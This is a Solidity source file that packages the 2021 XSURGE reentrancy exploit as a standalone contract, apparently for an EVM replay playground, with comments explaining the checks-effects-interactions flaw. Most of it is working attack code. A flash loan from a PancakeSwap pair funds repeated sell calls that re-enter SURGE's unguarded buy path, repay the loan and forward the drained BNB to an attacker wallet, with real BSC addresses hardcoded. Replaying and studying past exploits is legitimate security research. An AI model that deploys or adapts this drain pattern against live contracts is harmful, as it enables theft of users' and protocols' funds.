// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

// Synthetic standalone exploit for the EVM Playground (2021-08-XSURGE).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `ContractTest` (the flash-loan callback `pancakeCall` AND the reentrancy hook
// `receive()` both live on the test itself, so there is no standalone contract
// to deploy). This contract is a faithful, self-contained copy of that inline
// attack — testExploit's body is moved into `run()`, and `pancakeCall` /
// `receive()` are preserved verbatim — so the playground can deploy it and
// record `run()`. Logic and constants are copied verbatim from
// test/XSURGE_exp.sol (the only change is `mywallet` becoming a constructor arg
// so profit is forwarded to the attacker EOA, and the `time` counter stays).
// No imports so it compiles inside any registry forge project.
//
// Root cause: SurgeToken.sell() sends the BNB payout via a raw `call{value:...}`
// BEFORE decrementing the seller's balance and totalSupply (a checks-effects-
// interactions violation). Its `nonReentrant` guard is on sell() only, while
// the buy path (`receive()` -> `purchase()` -> `mint()`) is unguarded. So
// during sell()'s BNB callback the attacker re-enters through `receive()` and
// is minted SURGE at a stale, supply-not-yet-reduced price — each round it
// ends up holding MORE SURGE than it sold. After 7 nested sell/rebuy rounds a
// final sell dumps the accumulated SURGE for the contract's whole BNB reserve.

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function transfer(address dst, uint256 wad) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ISurge {
    function sell(uint256 tokenAmount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract XSURGEDrain {
    address private constant PANCAKE_PAIR = 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0;
    address private constant SURGE = 0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21;
    IWBNB private constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IUniswapV2Pair private constant pair = IUniswapV2Pair(PANCAKE_PAIR);
    ISurge private constant surge = ISurge(SURGE);

    // Profit receiver (the attacker EOA). Mirrors `address public mywallet =
    // msg.sender;` in ContractTest — Foundry's test sender (DefaultSender).
    address public mywallet;
    // Reentrancy buy counter — caps the nested re-buys at 6 (same as the test).
    uint8 public time = 0;

    constructor(address _mywallet) {
        mywallet = _mywallet;
    }

    // step 0: flash-borrow 10,000 WBNB from the CAKE/WBNB pair. The pair calls
    // pancakeCall() below with the borrowed WBNB, which performs the whole drain.
    function run() external {
        pair.swap(0, 10_000 * 1e18, address(this), "0x00");
    }

    // Flash-loan callback — runs the full buy/sell spiral then repays + sweeps.
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // Unwrap the borrowed WBNB into native BNB to feed Surge's receive().
        WBNB.withdraw(WBNB.balanceOf(address(this)));

        // Buy #1: send all BNB to SURGE (receive -> purchase -> mint).
        (bool buy_successful,) = payable(SURGE).call{value: address(this).balance, gas: 40_000}("");

        // Seven sells. Each sell pays out BNB via call{} BEFORE updating state,
        // re-entering receive() to buy back at a stale price (time < 6).
        surge.sell(surge.balanceOf(address(this)));
        surge.sell(surge.balanceOf(address(this)));
        surge.sell(surge.balanceOf(address(this)));
        surge.sell(surge.balanceOf(address(this)));
        surge.sell(surge.balanceOf(address(this)));
        surge.sell(surge.balanceOf(address(this)));
        surge.sell(surge.balanceOf(address(this)));

        // Re-wrap the drained BNB into WBNB, repay the flash loan, keep the rest.
        WBNB.deposit{value: address(this).balance}();
        WBNB.transfer(PANCAKE_PAIR, 10_030 * 1e18);
        WBNB.transfer(mywallet, WBNB.balanceOf(address(this)));
    }

    // Reentrancy hook: during sell()'s BNB callback, re-enter through SURGE's
    // unguarded buy path while supply is still inflated.
    receive() external payable {
        if (msg.sender == SURGE && time < 6) {
            (bool buy_successful,) = payable(SURGE).call{value: address(this).balance, gas: 40_000}("");
            time++;
        }
    }
}
